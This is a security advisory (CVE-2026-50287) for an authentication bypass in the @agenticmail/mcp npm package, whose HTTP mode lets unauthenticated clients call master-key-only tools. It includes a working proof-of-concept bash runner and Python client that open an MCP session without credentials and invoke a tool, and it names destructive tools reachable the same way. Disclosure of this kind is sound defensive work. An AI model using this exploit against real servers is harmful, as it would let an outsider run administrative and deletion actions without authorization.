# [H] @agenticmail/mcp Missing Authentication for Critical Function

## Summary
Severity: High
Advisory: GHSA-63gr-g7jc-v8rg
CVE: CVE-2026-50287
CWE: CWE-306
Ecosystem: npm
CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N (CVSS_V4)
Published: 2026-06-01
Source: https://github.com/advisories/GHSA-63gr-g7jc-v8rg
Type: github-advisory

## Affected
- npm: `@agenticmail/mcp` — affected >=0 <0.9.27

## Details
# AgenticMail MCP HTTP authorization bypass

## Summary

`@agenticmail/mcp` exposes a Streamable HTTP transport when started with
`--http` or `MCP_HTTP=1`. In that mode, the `/mcp` endpoint accepts requests
without any HTTP authentication layer. A remote client can initialize a
session and call tools directly.

The problem is that the MCP server also exposes tools documented as requiring
`AGENTICMAIL_MASTER_KEY`, and the server process forwards those calls using its
own configured master key. As a result, any client that can reach the MCP HTTP
port can invoke master-only operations without knowing the master key.

## Impact

An unauthenticated network client can invoke master-key-only MCP tools through
the server, including administrative and gateway actions.

Confirmed with a read-only tool:

- `setup_guide`

The same path reaches higher-impact tools such as:

- `setup_email_relay`
- `setup_email_domain`
- `delete_agent`
- `cleanup_agents`
- `send_test_email`

## Affected Code

- `packages/mcp/src/index.ts`
- `packages/mcp/src/tools.ts`
- `packages/mcp/README.md`

Relevant observations:

- `packages/mcp/src/index.ts` starts an HTTP server for `/mcp` without
  checking an Authorization header.
- `packages/mcp/src/tools.ts` marks gateway/admin tools as master-key tools
  and forwards them with the server-side `AGENTICMAIL_MASTER_KEY`.
- `packages/mcp/README.md` documents that gateway/admin tools require the
  master key.

## Reproduction

Use the bundled one-command PoC runner:

```bash
cd agenticmail
./scripts/run_agenticmail_mcp_http_unauth_poc.sh
```

Expected success output:

```text
[+] received mcp-session-id without authentication: ...
[+] tools/call(setup_guide) HTTP status: 200
[+] SUCCESS: unauthenticated HTTP client invoked MCP tool `setup_guide`
```

## PoC Files

- [scripts/run_agenticmail_mcp_http_unauth_poc.sh](scripts/run_agenticmail_mcp_http_unauth_poc.sh)
  - One-command wrapper that starts the API, starts MCP in HTTP mode, runs the
    client PoC, and cleans up background processes.
- [scripts/agenticmail_mcp_http_unauth_poc.py](scripts/agenticmail_mcp_http_unauth_poc.py)
  - Unauthenticated MCP client that sends `initialize` and then calls
    `setup_guide`.

## Inline PoC

The following PoC is non-destructive. It calls `setup_guide`, which is
documented as a master-key tool but only returns setup guidance.

### `scripts/run_agenticmail_mcp_http_unauth_poc.sh`

```bash
#!/usr/bin/env bash
set -euo pipefail

REPO_DIR="."
POC="scripts/agenticmail_mcp_http_unauth_poc.py"

API_HOST="${API_HOST:-127.0.0.1}"
API_PORT="${API_PORT:-}"
MCP_PORT="${MCP_PORT:-}"
MASTER_KEY="${AGENTICMAIL_MASTER_KEY:-mk_path4_poc_master}"
DATA_DIR="${AGENTICMAIL_DATA_DIR:-.poc-data}"
LOG_DIR="${LOG_DIR:-.poc-logs}"

mkdir -p "$DATA_DIR" "$LOG_DIR"

node_major="$(node -p 'Number(process.versions.node.split(".")[0])' 2>/dev/null || echo 0)"
if (( node_major < 20 )); then
  echo "[-] Node.js 20+ is required; current node is: $(node -v 2>/dev/null || echo missing)" >&2
  exit 2
fi

find_free_port() {
  python3 - <<'PY'
import socket
with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
    sock.bind(("127.0.0.1", 0))
    print(sock.getsockname()[1])
PY
}

[[ -n "$API_PORT" ]] || API_PORT="$(find_free_port)"
[[ -n "$MCP_PORT" ]] || MCP_PORT="$(find_free_port)"

api_pid=""
mcp_pid=""
cleanup() {
  set +e
  [[ -z "${mcp_pid:-}" ]] || kill "$mcp_pid" 2>/dev/null || true
  [[ -z "${api_pid:-}" ]] || kill "$api_pid" 2>/dev/null || true
}
trap cleanup EXIT

wait_tcp() {
  local host="$1"
  local port="$2"
  local name="$3"
  for _ in $(seq 1 60); do
    if python3 - "$host" "$port" >/dev/null 2>&1 <<'PY'
import socket
import sys
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.settimeout(1)
try:
    sock.connect((sys.argv[1], int(sys.argv[2])))
    sys.exit(0)
except Exception:
    sys.exit(1)
finally:
    sock.close()
PY
    then
      echo "[+] $name is listening: $host:$port"
      return 0
    fi
    sleep 1
  done
  echo "[-] Timed out waiting for $name: $host:$port" >&2
  return 1
}

cd "$REPO_DIR"

echo "[+] Starting AgenticMail API on $API_HOST:$API_PORT"
(
  export AGENTICMAIL_API_HOST="$API_HOST"
  export AGENTICMAIL_API_PORT="$API_PORT"
  export AGENTICMAIL_MASTER_KEY="$MASTER_KEY"
  export AGENTICMAIL_DATA_DIR="$DATA_DIR"
  npm run dev:api
) >"$LOG_DIR/api.log" 2>&1 &
api_pid="$!"
wait_tcp "$API_HOST" "$API_PORT" "AgenticMail API"

echo "[+] Starting AgenticMail MCP HTTP server on port $MCP_PORT"
(
  export AGENTICMAIL_API_URL="http://$API_HOST:$API_PORT"
  export AGENTICMAIL_MASTER_KEY="$MASTER_KEY"
  export AGENTICMAIL_DATA_DIR="$DATA_DIR"
  npm --workspace=@agenticmail/mcp run dev -- --http "--port=$MCP_PORT"
) >"$LOG_DIR/mcp.log" 2>&1 &
mcp_pid="$!"
wait_tcp "127.0.0.1" "$MCP_PORT" "AgenticMail MCP HTTP server"

echo "[+] Running unauthenticated MCP client PoC"
python3 "$POC" --url "http://127.0.0.1:$MCP_PORT/mcp"
```

### `scripts/agenticmail_mcp_http_unauth_poc.py`

```python
#!/usr/bin/env python3
from __future__ import annotations

import argparse
import json
import sys
import urllib.error
import urllib.request


def post_json(url: str, payload: dict, session_id: str | None = None) -> tuple[int, dict, str]:
    data = json.dumps(payload).encode("utf-8")
    headers = {
        "Content-Type": "application/json",
        "Accept": "application/json, text/event-stream",
    }
    if session_id:
        headers["mcp-session-id"] = session_id

    req = urllib.request.Request(url, data=data, headers=headers, method="POST")
    try:
        with urllib.request.urlopen(req, timeout=15) as resp:
            body = resp.read().decode("utf-8", errors="replace")
            return resp.status, dict(resp.headers), body
    except urllib.error.HTTPError as exc:
        body = exc.read().decode("utf-8", errors="replace")
        return exc.code, dict(exc.headers), body


def parse_sse_or_json(body: str) -> list[dict]:
    events: list[dict] = []
    stripped = body.strip()
    if not stripped:
        return events
    if stripped.startswith("{") or stripped.startswith("["):
        parsed = json.loads(stripped)
        return parsed if isinstance(parsed, list) else [parsed]
    for line in body.splitlines():
        if not line.startswith("data:"):
            continue
        data = line[len("data:") :].strip()
        if not data:
            continue
        try:
            events.append(json.loads(data))
        except json.JSONDecodeError:
            pass
    return events


def main() -> int:
    parser = argparse.ArgumentParser()
    parser.add_argument("--url", default="http://127.0.0.1:8014/mcp")
    parser.add_argument("--tool", default="setup_guide")
    args = parser.parse_args()

    init_payload = {
        "jsonrpc": "2.0",
        "id": 1,
        "method": "initialize",
        "params": {
            "protocolVersion": "2025-03-26",
            "capabilities": {},
            "clientInfo": {"name": "agenticmail-unauth-poc", "version": "0.1"},
        },
    }

    status, headers, body = post_json(args.url, init_payload)
    print(f"[+] initialize HTTP status: {status}")
    print(f"[+] initialize response body: {body[:500]}")
    session_id = headers.get("mcp-session-id") or headers.get("Mcp-Session-Id")
    if not session_id:
        print("[-] No mcp-session-id header returned")
        return 2
    print(f"[+] received mcp-session-id without authentication: {session_id}")

    post_json(args.url, {
        "jsonrpc": "2.0",
        "method": "notifications/initialized",
        "params": {},
    }, session_id=session_id)

    status, _headers, body = post_json(args.url, {
        "jsonrpc": "2.0",
        "id": 2,
        "method": "tools/call",
        "params": {"name": args.tool, "arguments": {}},
    }, session_id=session_id)
    print(f"[+] tools/call({args.tool}) HTTP status: {status}")
    print("[+] raw response:")
    print(body)

    if any("result" in msg for msg in parse_sse_or_json(body)):
        print(f"[+] SUCCESS: unauthenticated HTTP client invoked MCP tool `{args.tool}`")
        return 0

    print("[-] Tool call did not return a result")
    return 1


if __name__ == "__main__":
    sys.exit(main())
```

## Why This Is a Vulnerability

The project treats `AGENTICMAIL_MASTER_KEY` as the authorization boundary for
administrative and gateway operations. HTTP MCP mode removes the client-side
authentication boundary entirely, so an unauthenticated network client becomes
an indirect caller of master-only API functionality.


## Suggested Fix

- Require authentication for HTTP MCP mode.
- Bind the MCP HTTP server to `127.0.0.1` by default.
- Reject `/mcp` requests that lack a valid bearer token or shared secret.
- Disable master-key tools when the transport is unauthenticated.

## References
- https://github.com/agenticmail/agenticmail/security/advisories/GHSA-63gr-g7jc-v8rg
- https://nvd.nist.gov/vuln/detail/CVE-2026-50287
- https://github.com/agenticmail/agenticmail/commit/7b9b05d973676e9f3d097c08b8e649f59bfc15d0
- https://github.com/agenticmail/agenticmail/commit/7d1791da7c8c8bd4e70d7081db48e18ab55f6736
- https://github.com/agenticmail/agenticmail
- https://github.com/agenticmail/agenticmail/blob/7b9b05d973676e9f3d097c08b8e649f59bfc15d0/CHANGELOG.md?plain=1#L10
- https://github.com/agenticmail/agenticmail/blob/7b9b05d973676e9f3d097c08b8e649f59bfc15d0/packages/mcp/README.md?plain=1#L13
- https://github.com/agenticmail/agenticmail/blob/7b9b05d973676e9f3d097c08b8e649f59bfc15d0/packages/mcp/src/index.ts#L311
